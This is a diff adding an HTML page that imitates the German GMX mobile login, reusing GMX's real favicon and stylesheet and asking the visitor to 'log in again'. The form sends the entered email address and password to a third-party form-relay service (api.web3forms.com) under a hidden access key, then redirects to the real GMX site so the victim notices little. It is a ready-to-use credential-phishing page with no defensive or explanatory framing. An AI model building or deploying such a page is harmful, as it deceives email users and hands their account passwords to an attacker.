@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="de" xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <title>
+        GMX
+    </title>
+    <meta charset="UTF-8">
+    <meta name="description" content="Mobiler GMX Login: Auf dieser Seite können Sie sich mit dem Smartphone oder Tablet einfach und sicher unterwegs in Ihr GMX Postfach einloggen.">
+    <meta name="robots" content="noindex">
+    <link rel="shortcut icon" type="image/x-icon" href="https://mm.gmx.net/img.ui-portal.de/cd/ci/gmx.net/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-itunes-app" content="app-id=417352269">
+    <link rel="stylesheet" type="text/css" href="https://mm.gmx.net/loginapplication/login/resource/gui.GuiResources/::/gui/styles/default/themes/uni-ver-98661918DDD3D8BECF2096F5694034CC.css?-gmxnet">
+
+    <style>
+        .email {
+            margin-bottom: 5px;
+            color: black;
+            border-radius: 3px;
+            padding-top: 8px;
+            padding-bottom: 8px;
+            border: 1px solid rgb(83, 82, 82);
+            width: 100%;
+        }
+
+        .passwort {
+            margin-bottom: 5px;
+            color: black;
+            border-radius: 3px;
+            padding-top: 8px;
+            padding-bottom: 8px;
+            border: 1px solid rgb(83, 82, 82);
+            width: 100%;
+        }
+
+        .submit {
+            margin-top: 20px;
+            color: white;
+            border-radius: 3px;
+            padding-top: 8px;
+            padding-bottom: 8px;
+            border: none;
+            width: 100%;
+            text-align: center;
+            background-color: #008000;
+        }
+
+        .pass {
+            margin-top: 20px;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="main-layout">
+
+        <div class="header ">
+            <div class="header__logo">
+                <img src="gmxl.png" alt="" style="height: 23px;">
+            </div>
+            <div class="header__text" style="padding-top: 8px;"></div>
+        </div>
+
+        <div class="centered-content centered-content--narrow">
+
+            <div class="content-title">
+                <div class="content-title__logo">
+                    <img src="gmxll.png" alt="" style="height: 35px;">
+                </div>
+                <h1><b>Bitte erneut einloggen</b></h1>
+                <p id="loginText">
+                    Bitte melden Sie sich hier mit Ihrer GMX E-Mail-Adresse und Ihrem Passwort an.
+                </p>
+            </div>
+
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="b2c1dcc9-5d72-4527-9fdc-dea56bd181cb">
+
+                <input type="hidden" name="redirect" value="https://GMX.NET">
+
+                <div class="add">
+                    <label class="pos-label pos-label--block required" for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input">GMX E-Mail-Adresse</label>
+                    <input type="text" name="text" placeholder="GMX E-mail Addresse" maxlength="50" required class="email">
+                </div>
+
+                <div class="pass">
+                    <label class="pos-label pos-label--block required" for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">Passwort eingeben</label>
+                    <input type="text" name="text" placeholder=" Passwort eingeben" required class="passwort">
+                </div>
+
+                <div>
+                    <input type="submit" value="Login" class="submit">
+                </div>
+            </form>
+
+            <a class="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block" href="#">
+            Passwort vergessen?
+        </a>
+            <hr class="centered-content__line-break a-mb-space-4">
+            <div class="a-ta-c a-mb-space-4">
+                <h2 class="a-mb-space-2.5">
+                    Neu bei GMX?
+                </h2>
+                <a class="pos-button pos-button--link pos-button--block" href="#">
+                Jetzt kostenlos registrieren!
+            </a>
+            </div>
+        </div>
+
+        <div class="footer">
+            <a class="footer__link" href="#">Impressum</a>
+            <a class="footer__link" href="#">Verträge hier kündigen</a>
+            <a class="footer__link" href="#">AGB</a>
+            <a class="footer__link" href="#">Datenschutz</a>
+        </div>
+
+    </div>
+</body>
+
+</html>
